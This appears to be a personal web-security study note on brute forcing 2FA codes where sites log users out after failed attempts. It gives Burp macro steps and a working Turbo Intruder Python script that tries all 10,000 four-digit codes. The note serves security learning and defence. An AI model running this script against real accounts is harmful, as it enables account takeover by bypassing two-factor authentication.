As with passwords, websites need to take steps to prevent brute forcing of the 2FA verification code. This is essentially important because the code is often a simple 4 or 6-digit number. Without adequate brute force protection, cracking such a code is trivial.

Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by creating macros for Burp Intruder, and/or using the Turbo Intruder extension.
## Example Exploit
In this example, we already have the username and password of our target user, but we still need the 2FA verification code. However, if we enter the wrong code an x amount of times, the website will force us to logout.
1. In Burp, we need to [create a macro](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FBurp%20Suite%20Tips%20%26%20Tricks%2FCreating%20Macros) to bypass the restriction and retrieve CSRF token.
2. Send the `POST /login2` request to Turbo Intruder. Then change the `mfa-code` parameter value to `%s` - which is the injector Turbo Intruder needed.
3. Use the following code then start the attack.
```python
# https://gist.github.com/bavlayan/aa7470b9692f05f29e6c8ea88e8bde85
def queueRequests(target, wordlists):
    engine = RequestEngine(
	    endpoint=target.endpoint,
        concurrentConnections=1,
        #requestsPerConnection=100,
        #pipeline=False,
		engine=Engine.BURP
    )

    for num in range(0, 10000):
        mfa_code = '{0:04}'.format(num)
        engine.queue(target.req, mfa_code.rstrip())


def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```